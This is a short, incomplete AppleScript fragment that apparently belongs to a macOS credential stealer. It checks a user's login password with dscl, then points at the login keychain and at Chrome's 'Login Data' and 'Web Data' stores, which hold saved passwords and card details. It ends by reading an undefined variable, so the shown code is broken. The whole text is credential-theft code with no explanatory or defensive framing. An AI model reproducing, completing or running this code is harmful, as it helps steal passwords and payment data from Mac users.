do shell script "dscl . authonly user password"
set target to "Keychains/login.keychain-db"
set profile to "Google/Chrome/"
set stores to {"/Login Data", "/Web Data"}
set data to read source
